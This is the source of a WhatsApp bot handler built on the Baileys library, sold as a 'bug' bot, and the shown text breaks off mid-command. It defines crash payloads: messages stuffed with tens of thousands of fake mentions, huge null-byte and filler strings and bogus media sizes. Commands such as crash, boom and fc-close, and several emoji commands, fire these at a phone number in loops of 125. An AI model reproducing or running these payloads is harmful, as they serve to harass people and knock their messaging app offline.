/*
┏━━━━━━━━━━━━━━━┓
┃     𝐉𝐀𝐌𝐄𝐒𝐓𝐄𝐂𝐇
┣━━━━━━━━━━━━━━━┛
┃whatsapp : +254785016388
┃owner : james
┃base : vimpire killer 
┃best friend : ibrahim / trashcore dev
┃helper : my brain😂😂
┃maintainer : james
┃deals : t.me/jamespydev
┃pterodactyl hosting buy from james dev
┗━━━━━━━━━━━━━━━┛
*/
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = james = async (james, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await james.decodeJid(james.user.id);
const premuser = JSON.parse(fs.readFileSync("./VIMPIRE/database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!james.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await james.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));//======================
if (m.message) {
james.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}

// ғᴜɴᴄᴛɪᴏɴ ʙᴜɢ ᴡa
//FUNC FC X PROTOCOL3

// Modify by 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧

// Buy premium bug function
// WA. 254735342808
// Telegram @xh_clintonv


async function FcXDelay(target, mention) {
let bokepFc = JSON.stringify({
status: true,
criador: "ForceClose",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebjamesetUrl: "wss://web.whatsapp.com/ws/chat",
jamesCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnjamesCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});

let bokepFcV2 = JSON.stringify({
status: true,
criador: "ForceClose",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebjamesetUrl: "wss://web.whatsapp.com/ws/chat",
jamesCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnjamesCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: " ",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "1313550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".SkyzoDevoper",
                                    title: "gtau",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});
const contextInfo = {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "DIE MF😂",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
]
}
}
}
}
};

await james.relayMessage(target, messagePayload, { participant: { jid: target } });
await james.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await james.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
async function carouselNew(isTarget) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "CikssXyz" + "ꦾ".repeat(11000)
        },
        "footer": {
          "text": "dont panic!!"
        },
        "header": { 
          "title": 'memekk' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(isTarget, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "Kontol " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🐉 ) Tiger Crash V1 Gen 2 ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await james.relayMessage(isTarget, carousel.message, {
      messageId: carousel.key.id
    });
    console.log("flixce Sending Carousel New !!");
  }
}

async function Delay2(from) {
  await james.relayMessage(from, {
    "viewOnceMessage": {
      "message": {
        "interactiveResponseMessage": {
          "body": { "text": "Xeuka", "format": "DEFAULT" },
          "nativeFlowResponseMessage": {
            "name": "call_permission_request",
            "paramsJson": "\u0000".repeat(1000000),
            "version": 3
          }
        }
      }
    }
  }, { participant: { jid: from }});
}

async function superdelayinvid(target) {
  return {
    key: {
      remoteJid: target,
      fromMe: false,
      id: "BAE538D8B0529FB7",
    },
    message: {
      extendedTextMessage: {
        text: "f4ck you lookin at",
        contextInfo: {
          participant: "13135550002@s.whatsapp.net",
          quotedMessage: {
            extendedTextMessage: {
              text: "Stand Proud Worm",
            },
          },
          remoteJid: "status@broadcast"
        },
      },
    },
    messageTimestamp: Math.floor(Date.now() / 1000),
    broadcast: true,
    pushName:  "2709",
  };
}
/*

END DELAY

*/
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await james.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

// Func Delay Sticker
switch (command) {
case "king":
case "menu": {
    let itsmenu = 
`
◆━━━◇ \`𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄𝐒 𝗩1\`
│➤ 𝗻𝗮𝗺𝗲: 𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄𝐒 𝗩1
│➤ 𝗼𝘄𝗻𝗲𝗿: ✦ 𝐌𝐑 𝐒𝐌𝐈𝐋𝐄 ✦
│➤ 𝘃𝗲𝗿𝘀𝗶: 1.0 ✦
│➤ 𝘁𝘆𝗽𝗲: 𝗯𝘂𝗴 / 𝗰𝗮𝘀𝗲 ✦
│➤ 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: 𝙸'𝙼 𝙺𝙄𝐍𝐆 𝗦𝗠𝐈𝐋𝐄 𝗩1 𝗕𝗢𝗧
◆━━━━━━━━━━━━━━━━━━━━◇

◆━━◇ \`𝐊𝐈𝐍𝐆 𝗦𝗠𝐈𝐋𝐄 𝗕𝗨𝗚𝗦\`
╞━━━━━━━━━━━━━━◇
│➤ boom
│➤ delay-invis
│➤ crash
│➤ dragon
◆━━━━━━◇

◆━━━━━━◇ \`𝗙𝗖 𝗕𝗨𝗚𝗦\`
│➤ fc-boom
│➤ fc-close
◆━━━━━━━━━◇

◆━━━━━━◇\`𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨\`
│➤ addprem
│➤ delprem
│➤ friends
│➤ addfriend
│➤ delfriend
│➤ public
│➤ self
│➤ sc
◆━━━━━━━━━◇

◆━━━━━━◇ \`𝗘𝗠𝗢𝗝𝗜 𝗕𝗨𝗚𝗦\`
│➤ 💀
│➤ 😈
│➤ 😊
│➤ 😂
│➤ 😭
│➤ 🌹
◆━━━━━━━━━━━━━━━━◇

> powered by ✦ 𝐌𝐑 𝐒𝐌𝐈𝐋𝐄 ✦

`;

    // Read two different local pictures
    let menuImage = fs.readFileSync("./media/menu.jpg");   // main image
    let thumbImage = fs.readFileSync("./media/thumb.jpg"); // thumbnail image

    await james.sendMessage(m.chat, {
        image: menuImage,
        caption: itsmenu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄𝐒 𝐕1",
                newsletterJid: "120363297764334618@newsletter",
            },
            externalAdReply: {
                title: `𝐈𝐌 𝐊𝐈𝐍𝐆`,
                body: `𝐒𝐌𝐈𝐋𝐄𝐒 𝐕1`,
                thumbnail: thumbImage, // different picture
                sourceUrl: `https://whatsapp.com/channel/0029VaXaqHII1Bsd3g`,
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: m });
}
break;
case "sc": {
   let scriptCaption = 
` 

╭━━━❖ \`𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄𝐒 𝐁𝐎𝐓\` ❖━━━╮
┃ ⚙️ 𝐍𝐚𝐦𝐞      : 𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄 𝐕1
┃ 👑 𝐎𝐰𝐧𝐞𝐫     : 𝗠𝗿 𝗦𝗺𝗶𝗹𝗲
┃ 📁 𝐒𝐨𝐮𝐫𝐜𝐞   : 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐨𝐝𝐞
┃ 🔐 𝐀𝐜𝐜𝐞𝐬𝐬   : 𝐋𝐢𝐦𝐢𝐭𝐞𝐝 / 𝐁𝐮𝐲 𝐎𝐧𝐥𝐲
╰━━━━━━━━━━━━━━━━━━━━╯

📡 𝐌𝐚𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥:  
» https://whatsapp.com/channel/0029VaesBAXJJhzefVszDu3h

💬 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦:  
» https://t.me/mr_smile_202

🆘 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐇𝐮𝐛:  
» https://tiktok.com/@mr_smile_hacks

▶️ 𝐘𝐨𝐮𝐓𝐮𝐛𝐞:  
» https://www.youtube.com/@MrSmile_modders

✦ 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲: ★ 𝙈𝙍 𝙎𝙈𝙄𝙇𝙀 ★

`;

   await james.sendMessage(m.chat, {
      image: fs.readFileSync("./media/script.jpg"),
      caption: scriptCaption,
      contextInfo: {
         forwardingScore: 999,
         isForwarded: true,
         forwardedNewsletterMessageInfo: {
            newsletterName: "𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄𝐒 𝐕1", 
            newsletterJid: "120363297764334618@newsletter", 
         },
         externalAdReply: {
            title: "𝐘𝐎𝐔 𝐂𝐇𝐎𝐎𝐒𝐄𝐃", 
            body: "𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄𝐒 𝐕1", 
            thumbnail: fs.readFileSync("./media/script.jpg"), 
            sourceUrl: "https://whatsapp.com/channel/0029VaXaqHII1Bsd3g", 
            mediaType: 1,
            renderLargerThumbnail: false
         }
      }
   }, { quoted: m })
}
break;
case "addfriend": {
if (!isPremium) return m.reply(mess.premium);

   if (!text) return m.reply("❌ Please provide a name\n\nExample: .addfriend Alex")

   let name = text.trim()

   let friends = []
   try {
      friends = JSON.parse(fs.readFileSync("./database/friends.json", "utf8"))
   } catch (e) {
      friends = []
   }

   if (friends.includes(name)) {
      return james.sendMessage(m.chat, {
         image: fs.readFileSync("./media/friend.jpg"),
         caption: 
`  ╔═━━━━━━ ≪ °❈° ≫ ━━━━━═╗
║ ⚠️ *${name}* is already in the list!
╚═━━━━━━ ≪ °❈° ≫ ━━━━━═╝  `
      }, { quoted: m })
   }

   friends.push(name)
   fs.writeFileSync("./database/friends.json", JSON.stringify(friends, null, 2))

   await james.sendMessage(m.chat, {
      image: fs.readFileSync("./media/friend.jpg"),
      caption: 
` 
╭─❍ 𝙵𝚁𝙸𝙴𝙽𝙳 𝙰𝙳𝙳 ❍─╮
│ ✅ Successfully added: *${name}*
╰───────────────╯  `
   }, { quoted: m })
}
break;
case "delfriend": {
if (!isPremium) return m.reply(mess.premium);
   if (!text) return m.reply("❌ Please provide a name\n\nExample: .delfriend Alex")

   let name = text.trim()

   let friends = []
   try {
      friends = JSON.parse(fs.readFileSync("./database/friends.json", "utf8"))
   } catch (e) {
      friends = []
   }

   if (!friends.includes(name)) {
      return james.sendMessage(m.chat, {
         image: fs.readFileSync("./media/friend.jpg"),
         caption: 
`┏━━━❑ 𝙳𝙴𝙻𝙴𝚃𝙴 𝙵𝚁𝙸𝙴𝙽𝙳 ❑━━━┓
┃⚠️ *${name}* not found in list!
┗━━━━━━━━━━━━━━━━━━━━━❑`
      }, { quoted: m })
   }

   friends = friends.filter(f => f !== name)
   fs.writeFileSync("./database/friends.json", JSON.stringify(friends, null, 2))

   await james.sendMessage(m.chat, {
      image: fs.readFileSync("./media/friend.jpg"),
      caption: 
`┏━━━❑ 𝙳𝙴𝙻𝙴𝚃𝙴 𝙵𝚁𝙸𝙴𝙽𝙳 ❑━━━┓
┃🗑️ Deleted: *${name}*
┗━━━━━━━━━━━━━━━━━━━━━❑`
   }, { quoted: m })
}
break;
case "friends": {
   // Default bot friends
   let botFriends = [
`╭─❍ 𝐔𝐒𝐄𝐑 𝐋𝐈𝐒𝐓 ❍─╮
│ 🔹 giddy tennor
│ 🔹 james tech
│ 🔹 white tyler
│ 🔹 x-factor dev
│ 🔹 mzazi
╰────────────────╯`
   ]

   // Load user friends from JSON
   let userFriends = []
   try {
      let data = fs.readFileSync("./database/friends.json", "utf8")
      userFriends = JSON.parse(data)
   } catch (e) {
      userFriends = [] // fallback if file missing or empty
   }

   // Format into nice menu
   let friendsMenu = 
`┏━━━❑ \`ボ𝗙𝗥𝗜𝗘𝗡𝗗𝗦ボ\` ❑━━━┓

 *BOT FRIENDS*
${botFriends.map((f, i) => `┃ ${i+1}. ${f}`).join("\n")}

 *YOUR FRIENDS*
${userFriends.length > 0 ? userFriends.map((f, i) => `┃ ${i+1}. ${f}`).join("\n") : "┃ (none yet, add with .addfriend <name>)"}

┗━━━━━━━━━━━━━━━━━━━━━❑`

   // Load local menu image
   let friendImage = fs.readFileSync("./media/friend.jpg")

   await james.sendMessage(m.chat, {
       image: friendImage,
       caption: friendsMenu,
       contextInfo: {
           forwardingScore: 999,
           isForwarded: true,
           forwardedNewsletterMessageInfo: {
               newsletterName: "𝐅𝐑𝐈𝐄𝐍𝐃𝐒",
               newsletterJid: "120363297764334618@newsletter",
           },
           externalAdReply: {
               title: `𝐌𝐘 𝐅𝐑𝐈𝐄𝐍𝐃𝐒`,
               body: `Manage your friends`,
               thumbnail: friendImage,
               sourceUrl: `https://whatsapp.com/channel/0029VaXaqHII1Bsd3g`,
               mediaType: 1,
               renderLargerThumbnail: false
           }
       }
   }, { quoted: m })
}
break;
case "king":
case "crash":
case "delay-invis":
case "boom": {
if (!isPremium) return m.reply(mess.premium);
if (!text) return m.reply(`\`Example:\` : ${prefix+command} +254xxxxxxxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await james.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await james.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
m.reply(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 \`\n\n> *© 𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄𝐒 *`);

          for (let i = 0; i < 125; i++) {
          
            
await sleep(5000)
await superdelayinvid(isTarget)  
await sleep(5000)
await superdelayinvid(isTarget)
await superdelayinvid(isTarget)
await superdelayinvid(isTarget)
await sleep(5000)
await bulldozer(isTarget)
await Delay2(isTarget);
        }

    }
  
break;

//======================
case "😈":
case "💀":
case "😊": {
if (!isPremium) return m.reply(mess.premium);
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 254xxxxxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await james.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await james.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
m.reply(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️\`\n\n> *© 𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄𝐒 `);

          for (let i = 0; i < 125; i++) {
          await bulldozer(isTarget)
          await bulldozer(isTarget)
          await bulldozer(isTarget)
          await bulldozer(isTarget)
          await bulldozer(isTarget)
          await bulldozer(isTarget)
          await bulldozer(isTarget)
          await bulldozer(isTarget)
            await sleep(1500);
        }

    }
  
break;
case "😂":
case "😭":
case "🌹": {
if (!isPremium) return m.reply(mess.premium);
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 254xxxxxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await james.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await james.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
m.reply(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️\`\n\n> *© 𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄𝐒  `);

          for (let i = 0; i < 125; i++) {
          await carouselNew(isTarget)
          await carouselNew(isTarget)
          await carouselNew(isTarget)
          await carouselNew(isTarget)
          await carouselNew(isTarget)
          await carouselNew(isTarget)
          await carouselNew(isTarget)
          await carouselNew(isTarget)
          await carouselNew(isTarget)
          await carouselNew(isTarget)
          await carouselNew(isTarget)
          await FcXDelay(target, mention)
            await sleep(1500);
        }

    }
  
break;
case "fc-close":
case "fc-boom": {
if (!isPremium) return m.reply(mess.premium);
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 254xxxxxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await james.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await james.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
